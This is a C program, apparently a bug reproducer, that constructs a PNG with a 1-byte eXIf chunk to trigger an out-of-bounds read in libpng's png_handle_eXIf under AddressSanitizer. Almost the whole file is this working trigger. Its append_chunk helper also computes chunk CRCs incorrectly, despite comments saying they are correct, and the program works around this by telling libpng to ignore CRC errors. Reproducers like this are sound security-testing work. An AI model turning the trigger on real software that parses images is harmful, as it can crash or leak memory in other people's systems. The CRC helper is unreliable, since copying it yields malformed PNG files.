#include <png.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>

/* Simple CRC32 implementation for PNG chunk CRCs */
static uint32_t crc_table[256];
static int crc_table_computed = 0;

static void make_crc_table(void) {
    for (uint32_t n = 0; n < 256; n++) {
        uint32_t c = n;
        for (int k = 0; k < 8; k++) {
            if (c & 1) c = 0xEDB88320U ^ (c >> 1);
            else c = c >> 1;
        }
        crc_table[n] = c;
    }
    crc_table_computed = 1;
}

static uint32_t update_crc(uint32_t crc, const unsigned char *buf, size_t len) {
    uint32_t c = crc;
    if (!crc_table_computed) make_crc_table();
    for (size_t n = 0; n < len; n++) {
        c = crc_table[(c ^ buf[n]) & 0xFFU] ^ (c >> 8);
    }
    return c;
}

static uint32_t png_crc32(const unsigned char *buf, size_t len) {
    return update_crc(0xFFFFFFFFU, buf, len) ^ 0xFFFFFFFFU;
}

static void write_u32be(unsigned char *p, uint32_t v) {
    p[0] = (unsigned char)((v >> 24) & 0xFF);
    p[1] = (unsigned char)((v >> 16) & 0xFF);
    p[2] = (unsigned char)((v >> 8) & 0xFF);
    p[3] = (unsigned char)(v & 0xFF);
}

/* Build a minimal PNG with an eXIf chunk of length 1 (invalid per spec),
 * which triggers the out-of-bounds read in png_handle_eXIf. */

static void append_chunk(unsigned char *buf, size_t *pos, size_t cap,
                         const char type[4], const unsigned char *data, uint32_t len) {
    if (*pos + 12ULL + len > cap) {
        fprintf(stderr, "Buffer too small when appending chunk %c%c%c%c\n", type[0], type[1], type[2], type[3]);
        exit(1);
    }
    /* length */
    write_u32be(buf + *pos, len); *pos += 4;
    /* type */
    memcpy(buf + *pos, type, 4); *pos += 4;
    /* data */
    if (len > 0 && data != NULL) memcpy(buf + *pos, data, len);
    *pos += len;
    /* CRC over type + data */
    uint32_t crc = png_crc32((const unsigned char *)type, 4);
    if (len > 0 && data != NULL) crc = update_crc(crc, data, len) ^ 0U; /* update_crc doesn't xor final */
    /* finalize */
    crc ^= 0xFFFFFFFFU;
    write_u32be(buf + *pos, crc); *pos += 4;
}

/* Custom memory reader for libpng */
typedef struct {
    const unsigned char *data;
    size_t size;
    size_t offset;
} mem_reader_t;

static void png_mem_read(png_structp png_ptr, png_bytep outBytes, png_size_t byteCountToRead) {
    mem_reader_t *mr = (mem_reader_t *)png_get_io_ptr(png_ptr);
    if (mr->offset + byteCountToRead > mr->size) {
        png_error(png_ptr, "read past end of buffer");
        return;
    }
    memcpy(outBytes, mr->data + mr->offset, byteCountToRead);
    mr->offset += byteCountToRead;
}

int main(void) {
    /* Build PNG in memory */
    unsigned char pngbuf[512];
    size_t pos = 0;

    /* PNG signature */
    static const unsigned char sig[8] = { 0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A };
    memcpy(pngbuf + pos, sig, 8); pos += 8;

    /* IHDR chunk: 1x1, 8-bit grayscale */
    unsigned char ihdr[13];
    write_u32be(ihdr + 0, 1);  /* width */
    write_u32be(ihdr + 4, 1);  /* height */
    ihdr[8]  = 8;  /* bit depth */
    ihdr[9]  = 0;  /* color type: grayscale */
    ihdr[10] = 0;  /* compression */
    ihdr[11] = 0;  /* filter */
    ihdr[12] = 0;  /* interlace */
    append_chunk(pngbuf, &pos, sizeof(pngbuf), "IHDR", ihdr, 13);

    /* eXIf chunk with length < 4 (1 byte), triggers OOB read in png_handle_eXIf */
    unsigned char exif_data[1] = { 0x00 };
    append_chunk(pngbuf, &pos, sizeof(pngbuf), "eXIf", exif_data, 1);

    /* Minimal IDAT (zero-length is allowed; png_read_info stops before reading it) */
    append_chunk(pngbuf, &pos, sizeof(pngbuf), "IDAT", NULL, 0);

    /* IEND */
    append_chunk(pngbuf, &pos, sizeof(pngbuf), "IEND", NULL, 0);

    /* Set up libpng reader */
    png_structp png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        fprintf(stderr, "png_create_read_struct failed\n");
        return 1;
    }

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        fprintf(stderr, "png_create_info_struct failed\n");
        png_destroy_read_struct(&png_ptr, NULL, NULL);
        return 1;
    }

    if (setjmp(png_jmpbuf(png_ptr))) {
        /* Even if libpng errors out later, the OOB read occurs when parsing eXIf */
        png_destroy_read_struct(&png_ptr, &info_ptr, NULL);
        fprintf(stderr, "libpng bailed out (this is expected after triggering the bug)\n");
        return 0;
    }

    /* Be tolerant about CRC to avoid early aborts if anything is off */
    png_set_crc_action(png_ptr, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE);

    mem_reader_t mr = { pngbuf, pos, 0 };
    png_set_read_fn(png_ptr, &mr, png_mem_read);

    /* This will parse header chunks including our eXIf and trigger the OOB read */
    png_read_info(png_ptr, info_ptr);

    /* Clean up */
    png_destroy_read_struct(&png_ptr, &info_ptr, NULL);

    /* If we reached here without ASan aborting, print a message */
    fprintf(stderr, "Completed without ASan abort (unexpected if bug is present).\n");
    return 0;
}
